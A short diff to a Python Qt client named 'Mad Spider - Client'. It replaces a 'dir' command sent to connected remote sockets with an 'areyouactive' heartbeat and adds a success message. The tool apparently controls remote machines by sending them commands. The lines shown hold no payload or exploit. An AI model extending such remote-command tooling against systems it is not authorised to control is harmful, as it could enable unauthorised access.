@@ -264,7 +264,7 @@ class MainDialog(QWidget, gui.Ui_Form):
                     break
 
             else:
-                self.Send('dir')
+                self.Send('areyouactive')
 
             try:
                 self.data = self.Receive()
@@ -274,9 +274,10 @@ class MainDialog(QWidget, gui.Ui_Form):
                         self.displayText(msg='<br><br><p align="center"><font size=42 color=red>Access Denied</font></p>',
                                          error='Authentication Error')
                         continue
-                    else:
+                    elif self.data == 'iamactive':
                         self.active = True
-                        self.displayText(msg=self.data.split('[ENDOFMESSAGE]')[0])
+                        self.displayText(msg='<br><br><p align="center"><font size=42 color=green>Access Success</font></p>',
+                                        header='Authentication Succes')
                         self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
                         self.tabWidget.setEnabled(True)
                         self.unlockedSocks.append(self.sockItems[self.sockind])
